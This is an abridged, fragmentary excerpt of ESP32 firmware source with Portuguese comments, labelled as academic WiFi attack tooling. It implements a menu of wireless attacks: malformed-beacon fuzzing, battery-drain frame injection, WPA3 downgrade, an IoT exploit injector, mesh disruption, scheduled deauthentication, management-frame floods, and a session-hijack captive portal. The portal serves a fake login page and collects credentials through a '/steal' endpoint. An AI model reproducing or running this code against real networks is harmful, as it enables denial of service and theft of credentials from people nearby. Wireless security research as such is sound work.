 ...
 * @brief Implementação de ataques WiFi avançados para fins acadêmicos e
 * pesquisa.
 *
...
static TaskHandle_t attack_task_handle __attribute__((unused)) = NULL;
...
static const int iot_oui_count =
    (int)(sizeof(iot_oui_database) / sizeof(OUIEntry));
...
bool stringToMac(const String &str, uint8_t *mac) {
  return sscanf(str.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", &mac[0], &mac[1],
                &mac[2], &mac[3], &mac[4], &mac[5]) == 6;
}

bool isMulticastMac(const uint8_t *mac) { return (mac[0] & 0x01) != 0; }
...
void deinitAdvancedAttackMode() {
  ...
  if (WiFi.status() != WL_CONNECTED &&
      WiFi.softAPSSID() != willyConfig.wifiAp.ssid) {
    wifiDisconnect();
  }
}
...
void advancedAtksMenu() {
  options.clear();
  options.push_back({"Beacon Fuzzer", [&]() { dynamicBeaconFuzzer(); }});
  options.push_back({"Battery Drain", [&]() { clientBatteryDrain(); }});
  options.push_back({"Visual Heatmap", [&]() { visualWifiHeatmap(); }});
  options.push_back({"WPA3 Downgrade", [&]() { wpa3DowngradeAttack(); }});
  options.push_back({"IoT Exploit Injector", [&]() { iotExploitInjector(); }});
  options.push_back({"Mesh Disruptor", [&]() { meshDisruptor(); }});
  options.push_back({"Smart Deauth", [&]() { smartDeauthScheduler(); }});
  options.push_back(
      {"Traffic Fingerprint", [&]() { encryptedTrafficFingerprint(); }});
  options.push_back({"Session Hijack", [&]() { sessionHijackPortal(); }});
  options.push_back({"Mgmt Frame Bypass", [&]() { mgmtFrameBypassFlood(); }});
  addOptionToMainMenu();
  ...
  while (attack_running) {
    ...
    if (config.malformed_ie) {
      ...
      for (int i = 0; i < 16 && (ie_offset + i) < 128; i++) {
        beacon_buffer[ie_offset + i] =
            malformed_beacon_templates[template_idx][i];
      }
    ...
    if (millis() - last_update > 1000) {
      ...
      padprintln("Taxa: " +
                 String(frame_count / ((millis() - last_update) / 1000 + 1)) +
                 "/s");
...
void clientBatteryDrain() {
  ...
  while (attack_running) {
    ...
    for (const auto &ap : ap_list) {
      ...
      // Envia PS-Poll
      esp_wifi_80211_tx(WIFI_IF_AP, ps_poll_frame, sizeof(ps_poll_template),
                        false);

      // Envia NULL data com MoreData flag
      esp_wifi_80211_tx(WIFI_IF_AP, null_frame, sizeof(null_data_template),
                        false);
...
void visualWifiHeatmap() {
  ...
  while (attack_running) {
    ...
    // Limpa área do mapa
    tft.fillRect(10, margin_top, map_width, map_height, willyConfig.bgColor);

    // Desenha grid
    tft.setTextColor(TFT_DARKGREY);
    for (int x = 10; x < display_width - 10; x += map_width / 4) {
      tft.drawLine(x, margin_top, x, display_height - margin_bottom,
                   TFT_DARKGREY);
    }
    for (int y = margin_top; y < display_height - margin_bottom;
         y += map_height / 4) {
    ...
    for (int i = 0; i < nets && i < 20; i++) {
      ...
      int y =
          margin_top + map_height / 2 + random(-map_height / 4, map_height / 4);
...
void wpa3DowngradeAttack() {
  ...
  for (int idx : wpa3_networks) {
    ...
    if (name.length() == 0)
      name = "<Hidden>";
    options.push_back(
        {name.substring(0, 20).c_str(), [&sel_idx, idx]() { sel_idx = idx; }});
  }
  addOptionToMainMenu();

  loopOptions(options, MENU_TYPE_SUBMENU, "Selecione Rede WPA3");

  if (returnToMenu || sel_idx < 0)
    return;
...
void iotExploitInjector() {
  ...
  for (size_t i = 0; i < iot_devices.size(); i++) {
    ...
    String name = ssid.substring(0, 12) + " [" +
                  String(iot_devices[i].second.vendor) + "]";
    int idx = i;
...
void meshDisruptor() {
  ...
  while (attack_running) {
    ...
    for (int i = 0; i < 10; i++) {
      esp_wifi_80211_tx(WIFI_IF_AP, path_request_frame,
                        sizeof(path_request_frame), false);
      frame_count++;
      vTaskDelay(5 / portTICK_PERIOD_MS);
    }
...
void smartDeauthScheduler() {
  ...
  while (attack_running) {
    ...
    if (now - last_update > 500) {
      ...
      padprintln("Intervalo: " + String(active_schedule.interval_ms / 1000) +
                 "s");

      // Tempo até próximo burst
      uint32_t next_burst =
          (active_schedule.interval_ms - (now - last_burst)) / 1000;
...
String generateHijackPage(const String &target_domain) {
  String page =
      ...
      ".container{background:white;padding:30px;border-radius:10px;max-width:"
      "400px;margin:auto;}"
      "h1{color:#333;text-align:center;}"
      "input{width:100%;padding:12px;margin:10px 0;border:1px solid "
      "#ccc;border-radius:4px;}"
      "button{width:100%;padding:12px;background:#007bff;color:white;border:"
...
void sessionHijackPortal() {
  ...
  server.on("/steal", HTTP_POST, [](AsyncWebServerRequest *request) {
    ...
    // Extrai dados
    for (size_t i = 0; i < (size_t)request->args(); i++) {
  ...
  while (attack_running) {
    ...
    if (config.rotate_channels) {
      current_channel =
          ...
          (channel_idx % (config.end_channel - config.start_channel + 1));
      esp_wifi_set_channel(current_channel, WIFI_SECOND_CHAN_NONE);
    }
    ...
    if (frame_type == 0) {
      ...
      esp_wifi_80211_tx(WIFI_IF_AP, probe_req_frame, sizeof(probe_req_frame),
                        false);
    } else {
